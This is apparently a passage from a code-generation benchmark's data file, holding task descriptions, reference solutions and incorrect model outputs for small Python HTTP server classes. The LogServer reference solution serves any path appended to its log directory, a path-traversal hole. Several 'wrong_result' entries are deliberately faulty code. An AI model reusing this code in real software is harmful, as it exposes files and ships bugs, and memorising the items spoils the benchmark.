try:\n                decoded_file = base64.b64decode(file_data)\n                file_name = metadata.get('name', 'unknown_file')\n                file_path = os.path.join(self.OUTPUT_DIR, file_name)\n                with open(file_path, 'wb') as f:\n                    f.write(decoded_file)\n\n                # Register file via API\n                register_url = 'https://example.com/api/register'\n                register_data = {\n                    'file_path': file_path,\n                    'metadata': metadata\n                }\n                response = requests.post(register_url, json=register_data)\n                if response.status_code == 200:\n                    self._set_headers()\n                    self.wfile.write(b'{\"status\": \"success\", \"message\": \"File uploaded and registered\"}')\n                else:\n                    self._set_headers()\n                    self.wfile.write(b'{\"status\": \"error\", \"message\": \"Registration failed\"}')\n            except Exception as e:\n                self._set_headers()\n                self.wfile.write(f'{{\"status\": \"error\", \"message\": \"{str(e)}\"}}'.encode('utf-8'))"
  },
  {
    "Task_id": 223,
    "Instruction": "Task Description: Create a Python class that implements a simple HTTP server to serve static files (CSS, JavaScript, and images) with proper content types and error handling.\n\nClass Description: PVEDiscordDarkServer is a class that creates an HTTP server to serve static web resources including CSS files, JavaScript files, and various image formats (PNG, JPG, JPEG, SVG). It handles different file types with appropriate content headers and provides error responses for missing files or unsupported requests.\n\nAttributes:\nPORT: int - The port number on which the HTTP server will run\nDIR_SASS: str - The directory path containing CSS files\nDIR_IMAGES: str - The directory path containing image files\nDIR_JS: str - The directory path containing JavaScript files\n\nMethods:\n__init__(port=3000) -> None - Initializes the server with the specified port (default: 3000) and sets up directory paths for static files\nrun() -> None - Starts the HTTP server and begins serving requests indefinitely until interrupted\nRequestHandler: class - Inner class that handles HTTP requests (inherits from BaseHTTPRequestHandler)\n    __init__(*args, **kwargs) -> None - Initializes the request handler with directory paths\n    log_message(format, *args) -> None - Overrides default logging to suppress log messages\n    _set_headers(status, type) -> None - Helper method to set HTTP response headers\n    do_GET() -> None - Handles GET requests, serves appropriate files with correct content types, or returns error responses",
    "Canonical_solution": "from http.server import HTTPServer, BaseHTTPRequestHandler\nimport json\nimport os\n\nclass PVEDiscordDarkServer:\n    def __init__(self, port=3000):\n        self.PORT = port\n        self.DIR_SASS = os.path.join(os.path.dirname(__file__), \"sass\")\n        self.DIR_IMAGES = os.path.join(os.path.dirname(__file__), \"images\")\n        self.DIR_JS = os.path.join(os.path.dirname(__file__), \"js\")\n\n    class RequestHandler(BaseHTTPRequestHandler):\n        def __init__(self, *args, **kwargs):\n            self.DIR_SASS = kwargs.pop('DIR_SASS')\n            self.DIR_IMAGES = kwargs.pop('DIR_IMAGES')\n            self.DIR_JS = kwargs.pop('DIR_JS')\n            super().__init__(*args, **kwargs)\n\n        def log_message(self, format, *args):\n            return\n\n        def _set_headers(self, status, type):\n            self.send_response(status)\n            self.send_header(\"Content-type\", type)\n            self.end_headers()\n\n        def do_GET(self):\n            status = 200\n            type = \"application/json\"\n            data = None\n\n            file = self.path.rpartition(\"/\")[2]\n            ext = file.rpartition(\".\")[2]\n\n            if ext == \"css\":\n                data = open(os.path.join(self.DIR_SASS, \"PVEDiscordDark.css\"), \"rb\").read()\n                type = \"text/css\"\n            elif ext == \"js\":\n                data = open(os.path.join(self.DIR_JS, \"PVEDiscordDark.js\"), \"rb\").read()\n                type = \"application/javascript\"\n            elif ext in (\"png\", \"jpg\", \"jpeg\"):\n                try:\n                    data = open(os.path.join(self.DIR_IMAGES, file), \"rb\").read()\n                    type = f\"image/{ext}\"\n                except FileNotFoundError:\n                    status = 404\n            elif ext == \"svg\":\n                try:\n                    data = open(os.path.join(self.DIR_IMAGES, file), \"rb\").read()\n                    type = f\"image/svg+xml\"\n                except FileNotFoundError:\n                    status = 404\n            else:\n                status = 400\n            self._set_headers(status, type)\n            if status == 200:\n                self.wfile.write(data)\n            else:\n                self.wfile.write(json.dumps({\"error\": status}).encode())\n\n    def run(self):\n        print(f\"Serving on localhost:{self.PORT}\")\n        server = HTTPServer(\n            server_address=(\"\", self.PORT),\n            RequestHandlerClass=lambda *args, **kwargs: self.RequestHandler(\n                *args,\n                DIR_SASS=self.DIR_SASS,\n                DIR_IMAGES=self.DIR_IMAGES,\n                DIR_JS=self.DIR_JS,\n                **kwargs\n            )\n        )\n        try:\n            server.serve_forever()\n        except KeyboardInterrupt:\n            quit()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "from http.server import BaseHTTPRequestHandler, HTTPServer\nimport os\n\nclass PVEDiscordDarkServer:\n    PORT = 3000\n    DIR_SASS = \"static/css\"\n    DIR_IMAGES = \"static/images\"\n    DIR_JS = \"static/js\"\n\n    def __init__(self, port=3000):\n        self.PORT = port\n        self.DIR_SASS = \"static/css\"\n        self.DIR_IMAGES = \"static/images\"\n        self.DIR_JS = \"static/js\"\n\n    def run(self):\n        server_address = ('', self.PORT)\n        httpd = HTTPServer(server_address, self.RequestHandler)\n        print(f\"Server running on port {self.PORT}\")\n        try:\n            httpd.serve_forever()\n        except KeyboardInterrupt:\n            print(\"Server shutdown\")\n            httpd.shutdown()\n\n    class RequestHandler(BaseHTTPRequestHandler):\n        def __init__(self, *args, **kwargs):\n            self.DIR_SASS = \"static/css\"\n            self.DIR_IMAGES = \"static/images\"\n            self.DIR_JS = \"static/js\"\n            super().__init__(*args, **kwargs)\n\n        def log_message(self, format, *args):\n            return\n\n        def _set_headers(self, status, content_type):\n            self.send_response(status)\n            self.send_header('Content-type', content_type)\n            self.end_headers()\n\n        def do_GET(self):\n            path = self.path.strip('/')\n            if path == '':\n                path = 'index.html'\n            file_path = os.path.join(self.DIR_SASS, path) if path.endswith('.css') else \\\n                        os.path.join(self.DIR_JS, path) if path.endswith(('.js', '.json')) else \\\n                        os.path.join(self.DIR_IMAGES, path) if path.lower().endswith(('.png', '.jpg', '.jpeg', '.svg')) else None\n\n            if file_path and os.path.exists(file_path):\n                with open(file_path, 'rb') as f:\n                    content = f.read()\n                self._set_headers(200, 'text/css' if path.endswith('.css') else 'application/javascript' if path.endswith(('.js', '.json')) else 'image/png' if path.lower().endswith('.png') else 'image/jpeg' if path.lower().endswith('.jpg') else 'image/jpg' if path.lower().endswith('.jpeg') else 'image/svg+xml')\n                self.wfile.write(content)\n            else:\n                self._set_headers(404, 'text/plain')\n                self.wfile.write(b\"File not found\")"
  },
  {
    "Task_id": 224,
    "Instruction": "Task Description: Create a Python class that implements an HTTP server for sharing and viewing log files from a specified directory. The server should handle GET requests to display available log files and serve their contents.\n\nClass Description: The LogServer class creates an HTTP server that serves log files from a specified directory. It uses a custom request handler (LogSharedHandler) to process HTTP requests and serve either a directory listing or file contents.\n\nAttributes:\n- log_path: str - The directory path where log files are stored\n- port: int - The port number on which the HTTP server will listen\n- httpd: Optional[HTTPServer] - The HTTP server instance (None until started)\n\nMethods:\n- __init__(log_path: str, port: int) -> None - Initializes the LogServer with the specified log directory path and port number\n- start() -> None - Starts the HTTP server on 0.0.0.0 (all interfaces) using the specified port and serves requests indefinitely\n\nThe LogSharedHandler (inner class) handles HTTP requests with these methods:\n- do_GET() -> None - Processes GET requests:\n  - For root path (\"/\"), returns an HTML page listing all available log files as clickable links\n  - For specific file paths, returns the content of the requested log file\n  - Returns 404 if requested file doesn't exist",
    "Canonical_solution": "from http.server import BaseHTTPRequestHandler, HTTPServer\nimport os\nfrom typing import Optional\n\nclass LogSharedHandler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        log_path = os.getenv('LOG_PATH')\n        if self.path == \"/\":\n            html = \"<html><body>\"\n            for f in os.listdir(log_path):\n                html += f\"<p><a href=\\\"{f}\\\">{f}</a></p>\"\n            html += \"</body></html>\"\n\n            self.send_response(200)\n            self.send_header(\"Content-type\", \"text/html\")\n            self.end_headers()\n            self.wfile.write(html.encode())\n        else:\n            p = log_path + self.path\n            try:\n                with open(p, \"rb\") as file:\n                    self.send_response(200)\n                    self.send_header(\"Content-type\", \"text/plain\")\n                    self.end_headers()\n                    self.wfile.write(file.read())\n            except FileNotFoundError:\n                self.send_error(404, \"File not found\")\n\nclass LogServer:\n    def __init__(self, log_path: str, port: int):\n        self.log_path = log_path\n        self.port = port\n        self.httpd: Optional[HTTPServer] = None\n\n    def start(self):\n        self.httpd = HTTPServer(('0.0.0.0', self.port), LogSharedHandler)\n        self.httpd.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "```python\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\nimport os\n\nclass LogServer:\n    def __init__(self, log_path: str, port: int):\n        self.log_path = log_path\n        self.port = port\n        self.httpd = None\n\n    def start(self) -> None:\n        self.httpd = HTTPServer(('0.0.0.0', self.port), LogSharedHandler)\n        self.httpd.serve_forever()\n\nclass LogSharedHandler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        log_dir = self.server.log_path\n        if self.path == '/':\n            self.send_response(200)\n            self.send_header('Content-type', 'text/html')\n            self.end_headers()\n            files = os.listdir(log_dir)\n            html = '<html><body><h1>Log Files</h1><ul>'\n            for file in files:\n                html += f'<li><a href=\"{file}\">{file}</a></li>'\n            html += '</ul></body></html>'\n            self.wfile.write(html.encode())\n        else:\n            file_path = os.path.join(log_dir, self.path)\n            if os.path.isfile(file_path):\n                with open(file_path, 'r') as file:\n                    content = file.read()\n                self.send_response(200)\n                self.send_header('Content-type', 'text/plain')\n                self.end_headers()\n                self.wfile.write(content.encode())\n            else:\n                self.send_error(404, 'File not found')\n```"
  },
  {
    "Task_id": 226,
    "Instruction": "Task Description: Create a Python class that implements an HTTP server for resolving secret hashes to their corresponding secrets, specifically designed for XUD (Cross-chain Unidirectional Payment Channel) resolution.\n\nClass Description: The XUDResolver class is an HTTP server that handles POST requests containing secret hashes and responds with the corresponding secret if the hash matches a predefined secret. It uses Python's http.server module to create a simple HTTP server.\n\nAttributes:\n- host: str - The host address where the server will run (default: \"localhost\")\n- port: int - The port number for the server (default: 8000)\n- x_secret: str - A predefined secret in hexadecimal format\n- x_secret_hash: str - The SHA-256 hash of the predefined secret\n\nMethods:\n- __init__(host: str = \"localhost\", port: int = 8000) -> None - Initializes the XUDResolver with optional host and port parameters\n- resolve(request: dict) -> dict or None - Takes a request dictionary containing a \"secrethash\" and returns the corresponding secret if the hash matches, otherwise returns None\n- serve() -> None - Starts the HTTP server with a custom request handler that processes POST requests for secret resolution",
    "Canonical_solution": "import json\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\nfrom hashlib import sha256\nfrom eth_utils import to_bytes, to_hex\n\nclass XUDResolver:\n    def __init__(self, host=\"localhost\", port=8000):\n        self.host = host\n        self.port = port\n        self.x_secret = \"0x2ff886d47b156de00d4cad5d8c332706692b5b572adfe35e6d2f65e92906806e\"\n        self.x_secret_hash = to_hex(sha256(to_bytes(hexstr=self.x_secret)).digest())\n\n    def resolve(self, request):\n        if \"secrethash\" not in request:\n            return None\n\n        if request[\"secrethash\"] == self.x_secret_hash:\n            return {\"secret\": self.x_secret}\n        return None\n\n    def serve(self):\n        class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):\n            def __init__(self, *args, **kwargs):\n                self.resolver = kwargs.pop('resolver')\n                super().__init__(*args, **kwargs)\n\n            def do_POST(self):\n                try:\n                    content_len = int(self.headers.get(\"Content-Length\"))\n                    body = self.rfile.read(content_len)\n\n                    preimage = self.resolver.resolve(json.loads(body.decode(\"utf8\")))\n                    if preimage is None:\n                        self.send_response(404)\n                        self.end_headers()\n                    else:\n                        response = to_bytes(text=json.dumps(preimage))\n                        self.send_response(200)\n                        self.end_headers()\n                        self.wfile.write(response)\n                except BaseException:\n                    self.send_response(400)\n                    self.end_headers()\n\n        httpd = HTTPServer((self.host, self.port), lambda *args, **kwargs: SimpleHTTPRequestHandler(*args, resolver=self, **kwargs))\n        httpd.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "import http.server\nimport socketserver\nimport hashlib\nimport json\n\nclass XUDResolver:\n    def __init__(self, host: str = \"localhost\", port: int = 8000):\n        self.host = host\n        self.port = port\n        self.x_secret = \"your_predefined_secret_in_hex\"\n        self.x_secret_hash = hashlib.sha256(self.x_secret.encode()).hexdigest()\n\n    def resolve(self, request: dict) -> dict or None:\n        secrethash = request.get(\"secrethash\")\n        if secrethash == self.x_secret_hash:\n            return {\"secret\": self.x_secret}\n        return None\n\n    def serve(self):\n        class RequestHandler(http.server.BaseHTTPRequestHandler):\n            def do_POST(self):\n                content_length = int(self.headers['Content-Length'])\n                post_data = self.rfile.read(content_length)\n                request = json.loads(post_data.decode())\n                result = self.resolve(request)\n                if result:\n                    self.send_response(200)\n                    self.send_header('Content-type', 'application/json')\n                    self.end_headers()\n                    self.wfile.write(json.dumps(result).encode())\n                else:\n                    self.send_response(404)\n                    self.send_header('Content-type', 'application/json')\n                    self.end_headers()\n                    self.wfile.write(json.dumps({\"error\": \"Secret not found\"}).encode())\n\n        with socketserver.TCPServer((self.host, self.port), RequestHandler) as httpd:\n            print(f\"Serving at {self.host}:{self.port}\")\n            httpd.serve_forever()"
  },
  {
    "Task_id": 228,
    "Instruction": "Task Description: Create a custom HTTP server in Python that can serve content and be stopped after handling a single GET request.\n\nClass Description: This implementation consists of two classes: HttpRequestHandler (handles HTTP requests) and HttpServer (manages server operations). The server serves specified content when receiving a GET request and then stops itself.\n\nAttributes:\n\nAttribute1: stop [bool] - Flag indicating whether the server should stop running\nAttribute2: content [bytes] - The content to be served in response to GET requests\n\nMethods:\n\nMethod1: do_GET(self) -> None - Handles GET requests by sending a 200 response with the server's content and setting the stop flag\nMethod2: log_message(self, format, *args) -> None - Overrides default logging to suppress log messages\nMethod3: serve_forever(self, content) -> None - Starts the server with the given content and runs until a request is handled (stop flag is set)",
    "Canonical_solution": "import socket\nimport threading\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass HttpRequestHandler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        self.send_response(200)\n        self.send_header(\"Content-type\", \"text/html\")\n        self.end_headers()\n        self.wfile.write(self.server.content)\n        self.server.stop = True\n\n    def log_message(self, format, *args):\n        return\n\nclass HttpServer(HTTPServer):\n    def serve_forever(self, content):\n        self.stop = False\n        self.content = content\n        while not self.stop:\n            self.handle_request()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "import http.server\nimport socketserver\n\nclass HttpRequestHandler(http.server.BaseHTTPRequestHandler):\n    def __init__(self, request, client_address, server):\n        self.stop = False\n        self.content = None\n        super().__init__(request, client_address, server)\n\n    def do_GET(self):\n        if not self.stop:\n            self.send_response(200)\n            self.wfile.write(self.content)\n            self.stop = True\n\n    def log_message(self, format, *args):\n        pass\n\n    def serve_forever(self, content):\n        self.content = content\n        httpd = socketserver.TCPServer((\"\", 8000), self)\n        try:\n            httpd.serve_forever()\n        except KeyboardInterrupt:\n            httpd.server_close()\n\n\nclass HttpServer:\n    def __init__(self, content):\n        self.handler = HttpRequestHandler(None, None, None)\n        self.handler.content = content\n\n    def start(self):\n        self.handler.serve_forever(self.handler.content)"
  },
  {
    "Task_id": 229,
    "Instruction": "Task Description: Create a simple HTTP server in Python that can handle GET, HEAD, and POST requests, with customizable port configuration.\n\nClass Description: SimpleHTTPServer is a class that implements a basic HTTP server capable of processing GET, HEAD, and POST requests. It includes an inner RequestHandler class that manages the actual request processing and response generation.\n\nAttributes:\n- port: int - The port number on which the server will listen (default: 8080)\n- server_address: tuple - A tuple containing the server address and port (default: ('', port))\n- handler_class: class - The request handler class that processes HTTP requests\n\nMethods:\n- __init__(port: int = 8080) -> None - Initializes the server with the specified port\n- run() -> None - Starts the HTTP server and begins serving requests indefinitely\n- RequestHandler._set_headers() -> None - Sets basic HTTP response headers (200 status and text/html content type)\n- RequestHandler.do_GET() -> None - Handles HTTP GET requests\n- RequestHandler.do_HEAD() -> None - Handles HTTP HEAD requests\n- RequestHandler.do_POST() -> None - Handles HTTP POST requests, reading and printing the posted data",
    "Canonical_solution": "from http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass SimpleHTTPServer:\n    def __init__(self, port=8080):\n        self.port = port\n        self.server_address = ('', self.port)\n        self.handler_class = self.RequestHandler\n\n    class RequestHandler(BaseHTTPRequestHandler):\n        def _set_headers(self):\n            self.send_response(200)\n            self.send_header('Content-type', 'text/html')\n            self.end_headers()\n\n        def do_GET(self):\n            self._set_headers()\n\n        def do_HEAD(self):\n            self._set_headers()\n\n        def do_POST(self):\n            content_length = int(self.headers['Content-Length'])\n            post_data = self.rfile.read(content_length)\n            self._set_headers()\n            print(post_data)\n\n    def run(self):\n        httpd = HTTPServer(self.server_address, self.handler_class)\n        print('Starting httpd...')\n        httpd.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "class SimpleHTTPServer:\n    def __init__(self, port: int = 8080):\n        self.port = port\n        self.server_address = ('', port)\n        self.handler_class = RequestHandler\n\n    def run(self):\n        from http.server import HTTPServer\n        server = HTTPServer(self.server_address, self.handler_class)\n        print(f\"Server running on port {self.port}\")\n        server.serve_forever()\n\nclass RequestHandler:\n    def __init__(self):\n        self.path = ''\n\n    def _set_headers(self):\n        self.send_response(200)\n        self.send_header('Content-type', 'text/html')\n        self.end_headers()\n\n    def do_GET(self):\n        self._set_headers()\n        self.wfile.write(b'Hello, world!')\n\n    def do_HEAD(self):\n        self._set_headers()\n\n    def do_POST(self):\n        content_length = int(self.headers['Content-Length'])\n        post_data = self.rfile.read(content_length)\n        print(f\"POST request received: {post_data.decode()}\")\n        self._set_headers()\n        self.wfile.write(b'POST request processed')"
  },
  {
    "Task_id": 230,
    "Instruction": "Task Description: Create a mock HTTP server for testing purposes that can handle various types of requests (GET, POST) and responses (JSON, redirects, status codes).\n\nClass Description: MockServer is a context manager class that creates and manages a lightweight HTTP server in a separate thread for testing HTTP client functionality. It provides endpoints for testing different HTTP scenarios.\n\nAttributes:\n- httpd: [HTTPServer] - The HTTP server instance\n- address: [str] - The server's IP address (127.0.0.1)\n- port: [int] - The dynamically assigned port number\n- thread: [Thread] - The thread running the server\n\nMethods:\n- __enter__() -> [MockServer] - Starts the server in a new thread when entering the context\n- __exit__(exc_type, exc_value, traceback) -> [None] - Shuts down the server and cleans up when exiting the context\n- urljoin(url: Optional[str]) -> [str] - Constructs a full URL by joining the base server URL with an optional path\n\nNested Class: _RequestHandler (BaseHTTPRequestHandler) - Handles incoming HTTP requests\n\nMethods:\n- do_POST() -> [None] - Handles POST requests by echoing back the request body\n- do_GET() -> [None] - Handles GET requests with various endpoints:\n  * /headers - Returns request headers as JSON\n  * /status/204 - Returns empty 204 response\n  * /redirect - Chain of redirect responses\n  * Default - Returns 404 for unknown paths\n- _send_json(body: dict, status: int = 200) -> [None] - Helper method to send JSON responses",
    "Canonical_solution": "from http.server import HTTPServer, BaseHTTPRequestHandler\nfrom threading import Thread\nfrom urllib.parse import urljoin\nfrom typing import Optional\n\nclass _RequestHandler(BaseHTTPRequestHandler):\n    def do_POST(self) -> None:\n        content_length = int(self.headers.get(\"Content-Length\") or 0)\n        body_bytes = b\"Request body: \" + self.rfile.read(content_length)\n        self.send_response(200)\n        self.send_header(\"Content-Length\", str(len(body_bytes)))\n        self.end_headers()\n        self.wfile.write(body_bytes)\n\n    def do_GET(self) -> None:\n        if self.path == \"/headers\":\n            self._send_json(dict(self.headers))\n        elif self.path == \"/status/204\":\n            self.send_response(204)\n            self.end_headers()\n        elif self.path == \"/redirect2\":\n            self.send_response(302)\n            self.send_header(\"Content-Length\", \"0\")\n            self.send_header(\"Location\", \"/redirect\")\n            self.end_headers()\n        elif self.path == \"/redirect\":\n            self.send_response(301)\n            self.send_header(\"Content-Length\", \"0\")\n            self.send_header(\"Location\", \"/headers\")\n            self.end_headers()\n        else:\n            self._send_json({\"error\": \"unknown path\"}, status=404)\n\n    def _send_json(self, body: dict, status: int = 200) -> None:\n        body_bytes = json.dumps(body, indent=2).encode(\"utf8\")\n        self.send_response(status)\n        self.send_header(\"Content-Length\", str(len(body_bytes)))\n        self.send_header(\"Content-Type\", \"application/json\")\n        self.end_headers()\n        self.wfile.write(body_bytes)\n\nclass MockServer:\n    def __enter__(self):\n        self.httpd = HTTPServer((\"127.0.0.1\", 0), _RequestHandler)\n        self.address, self.port = self.httpd.server_address\n        self.thread = Thread(target=self.httpd.serve_forever)\n        self.thread.start()\n        return self\n\n    def __exit__(self, exc_type, exc_value, traceback):\n        self.httpd.shutdown()\n        self.thread.join()\n\n    def urljoin(self, url: Optional[str] = None) -> str:\n        return urljoin(f\"http://{self.address}:{self.port}\", url)",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "import http.server\nimport socketserver\nimport threading\nimport json\nimport os\n\nclass MockServer:\n    def __init__(self):\n        self.httpd = None\n        self.address = '127.0.0.1'\n        self.port = 0\n        self.thread = None\n        self._RequestHandler = self._RequestHandler\n\n    def __enter__(self):\n        self.port = self._find_free_port()\n        self.httpd = socketserver.TCPServer((self.address, self.port), self._RequestHandler)\n        self.thread = threading.Thread(target=self.httpd.serve_forever)\n        self.thread.start()\n        return self\n\n    def __exit__(self, exc_type, exc_value, traceback):\n        self.httpd.shutdown()\n        self.thread.join()\n\n    def urljoin(self, url: str = None) -> str:\n        if url:\n            return f'http://{self.address}:{self.port}{url}'\n        return f'http://{self.address}:{self.port}'\n\n    class _RequestHandler(http.server.BaseHTTPRequestHandler):\n        def do_POST(self):\n            content_length = int(self.headers['Content-Length'])\n            post_data = self.rfile.read(content_length)\n            self._send_json({'received': post_data.decode()}, 200)\n\n        def do_GET(self):\n            path = self.path\n            if path == '/headers':\n                self._send_json(self.headers.items(), 200)\n            elif path == '/status/204':\n                self._send_json({}, 204)\n            elif path == '/redirect':\n                self.send_response(301)\n                self.send_header('Location', self.urljoin('/redirect/2'))\n                self.end_headers()\n            elif path.startswith('/redirect/'):\n                parts = path.split('/')\n                if len(parts) > 2 and parts[2] == '2':\n                    self.send_response(301)\n                    self.send_header('Location', self.urljoin('/redirect/3'))\n                    self.end_headers()\n                elif len(parts) > 2 and parts[2] == '3':\n                    self.send_response(301)\n                    self.send_header('Location', self.urljoin('/redirect/4'))\n                    self.end_headers()\n                elif len(parts) > 2 and parts[2] == '4':\n                    self.send_response(301)\n                    self.send_header('Location', self.urljoin('/redirect/5'))\n                    self.end_headers()\n                elif len(parts) > 2 and parts[2] == '5':\n                    self.send_response(301)\n                    self.send_header('Location', self.urljoin('/redirect/6'))\n                    self.end_headers()\n                elif len(parts) > 2 and parts[2] == '6':\n                    self.send_response(301)\n                    self.send_header('Location', self.urljoin('/redirect/7'))\n                    self.end_headers()\n                elif len(parts) > 2 and parts[2] == '7':\n                    self.send_response(301)\n                    self.send_header('Location', self.urljoin('/redirect/8'))\n                    self.end_headers()\n                elif len(parts) > 2 and parts[2] == '8':\n                    self.send_response(301)\n                    self.send_header('Location', self.urljoin('/redirect/9'))\n                    self.end_headers()\n                elif len(parts) > 2 and parts[2] == '9':\n                    self.send_response(301)\n                    self.send_header('Location', self.urljoin('/redirect/10'))\n                    self.end_headers()\n                elif len(parts) > 2 and parts[2] == '10':\n                    self.send_response(301)\n                    self.send_header('Location', self.urljoin('/redirect/11'))\n                    self.end_headers()\n                elif len(parts) > 2 and parts[2] == '11':\n                    self.send_response(301)\n                    self.send_header('Location', self.urljoin('/redirect/12'))\n                    self.end_headers()\n                elif len(parts) > 2 and parts[2] == '12':\n                    self.send_response(301)\n                    self.send_header('Location', self.urljoin('/redirect/13'))\n                    self.end_headers()\n                elif len(parts) > 2 and parts[2] == '13':\n                    self.send_response(301)\n                    self.send_header('Location', self.urljoin('/redirect/14'))\n                    self.end_headers()\n                elif len(parts) > 2 and parts[2] == '14':\n                    self.send_response(301)\n                    self.send_header('Location', self.urljoin('/redirect/15'))\n                    self.end_headers()\n                elif len(parts) > 2 and parts[2] == '15':\n                    self.send_response(301)\n                    self.send_header('Location', self.urljoin('/redirect/16'))\n                    self.end_headers()\n                elif len(parts) > 2 and parts[2] == '16':\n                    self.send_response(301)\n                    self.send_header('Location', self.urljoin('/redirect/17'))\n                    self.end_headers()\n                elif len(parts) > 2 and parts[2] == '17':\n                    self.send_response(301)\n                    self.send_header('Location', self.urljoin('/redirect/18'))\n                    self.end_headers()\n                elif len(parts) > 2 and parts[2] == '18':\n                    self.send_response(301)\n                    self.send_header('Location', self.urljoin('/redirect/19'))\n                    self.end_headers()\n                elif len(parts) > 2 and parts[2] == '19':\n                    self.send_response(301)\n                    self.send_header('Location', self.urljoin('/redirect/20'))\n                    self.end_headers()\n                elif len(parts) > 2 and parts[2] == '20':\n                    self.send_response(301)\n                    self.send_header('Location', self.urljoin('/redirect/21'))\n                    self.end_headers()\n                elif len(parts) > 2 and parts[2] == '21':\n                    self.send_response(301)\n                    self.send_header('Location', self.urljoin('/redirect/22'))\n                    self.end_headers()\n                elif len(parts) > 2 and parts[2] == '22':\n                    self.send_response(301)\n                    self.send_header('Location', self.urljoin('/redirect/23'))\n                    self.end_headers()\n                elif len(parts) > 2 and parts[2] == '23':\n                    self.send_response(301)\n                    self.send_header('Location', self.urljoin('/redirect/24'))\n                    self.end_headers()\n                elif len(parts) > 2 and parts[2] == '24':\n                    self.send_response(301)\n                    self.send_header('Location', self.urljoin('/redirect/25'))\n                    self.end_headers()\n                elif len(parts) > 2 and parts[2] == '25':\n                    self.send_response(301)\n                    self.send_header('Location', self.urljoin('/redirect/26'))\n                    self.end_headers()\n                elif len(parts) > 2 and parts[2] == '26':\n                    self.send_response(301)\n                    self.send_header('Location', self.urljoin('/redirect/27'))\n                    self.end_headers()\n                elif len(parts) > 2 and parts[2] == '27':\n                    self.send_response(301)\n                    self.send_header('Location', self.urljoin('/redirect/28'))\n                    self.end_headers()\n                elif len(parts) > 2 and parts[2] == '28':\n                    self.send_response(301)\n                    self.send_header('Location', self.urljoin('/redirect/29'))\n                    self.end_headers()\n                elif len(parts) > 2 and parts[2] == '29':\n                    self.send_response(301)\n                    self.send_header('Location', self.urljoin('/redirect/30'))\n                    self.end_headers()\n                elif len(parts) > 2 and parts[2] == '30':\n                    self.send_response(301)\n                    self.send_header('Location', self.urljoin('/redirect/31'))\n                    self.end_headers()\n                elif len(parts) > 2 and parts[2] == '31':\n                    self.send_response(301)\n                    self.send_header('Location', self.urljoin('/redirect/32'))\n                    self.end_headers()\n                elif len(parts) > 2 and parts[2] == '32':\n                    self.send_response(301)\n                    self.send_header('Location', self.urljoin('/redirect/33'))\n                    self.end_headers()\n                elif len(parts) > 2 and parts[2] == '33':\n                    self.send_response(301)\n                    self.send_header('Location', self.urljoin('/redirect/34'))\n                    self.end_headers()\n                elif len(parts) > 2 and parts[2] == '34':\n                    self.send_response(301)\n                    self.send_header('Location', self.urljoin('/redirect/35'))\n                    self.end_headers()\n                elif len(parts) > 2 and parts[2] == '35':\n                    self.send_response(301)\n                    self.send_header('Location', self.urljoin('/redirect/36'))\n                    self.end_headers()\n                elif len(parts) > 2 and parts[2] == '36':\n                    self.send_response(301)\n                    self.send_header('Location', self.urljoin('/redirect/37'))\n                    self.end_headers()\n                elif len(parts) > 2 and parts[2] == '37':\n                    self.send_response(301)\n                    self.send_header('Location', self.urljoin('/redirect/38'))\n                    self.end_headers()\n                elif len(parts) > 2 and parts[2] == '38':\n                    self.send_response(301)\n                    self.send_header('Location', self.urljoin('/redirect/39'))\n                    self.end_headers()\n                elif len(parts) > 2 and parts[2] == '39':\n                    self.send_response(301)\n                    self.send_header('Location', self.urljoin('/redirect/40'))\n                    self.end_headers()\n                elif len(parts) > 2 and parts[2] == '40':\n                    self.send_response(301)\n                    self.send_header('Location', self.urljoin('/redirect/41'))\n                    self.end_headers()\n                elif len(parts) > 2 and parts[2] == '41':\n                    self.send_response(301)\n                    self.send_header('Location', self.urljoin('/redirect/42'))\n                    self.end_headers()\n                elif len(parts) > 2 and parts[2] == '42':\n                    self.send_response(301)\n                    self.send_header('Location', self.urljoin('/redirect/43'))\n                    self.end_headers()\n                elif len(parts) > 2 and parts[2] == '43':\n                    self.send_response(301)\n                    self.send_header('Location', self.urljoin('/redirect/44'))\n                    self.end_headers()\n                elif len(parts) > 2 and parts[2] == '44':\n                    self.send_response(301)\n                    self.send_header('Location', self.urljoin('/redirect/45'))\n                    self.end_headers()\n                elif len(parts) > 2 and parts[2] == '45':\n                    self.send_response(301)\n                    self.send_header('Location', self.urljoin('/redirect/46'))\n                    self.end_headers()\n                elif len(parts) > 2 and parts[2] == '46':\n                    self.send_response(301)\n                    self.send_header('Location', self.urljoin('/redirect/47'))\n                    self.end_headers()\n                elif len(parts) > 2 and parts[2] == '47':\n                    self.send_response(301)\n                    self.send_header('Location', self.urljoin('/redirect/48'))\n                    self.end_headers()\n                elif len(parts) > 2 and parts[2] == '48':\n                    self.send_response(301)\n                    self.send_header('Location', self.urljoin('/redirect/49'))\n                    self.end_headers()\n                elif len(parts) > 2 and parts[2] == '49':\n                    self.send_response(301)\n                    self.send_header('Location', self.urljoin('/redirect/50'))\n                    self.end_headers()\n                else:\n                    self.send_error(404, 'Not Found')\n            else:\n                self.send_error(404, 'Not Found')\n\n        def _send_json(self, body: dict, status: int = 200):\n            self.send_response(status)\n            self.send_header('Content-Type', 'application/json')\n            self.end_headers()\n            self.wfile.write(json.dumps(body).encode('utf-8'))\n\n    def _find_free_port(self):\n        for port in range(1024, 65535):\n            try:\n                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n                s.settimeout(1)\n                s.connect((self.address, port))\n                s.close()\n                return port\n            except OSError:\n                pass\n        raise Exception(\"No free port found\")"
  },
  {
    "Task_id": 231,
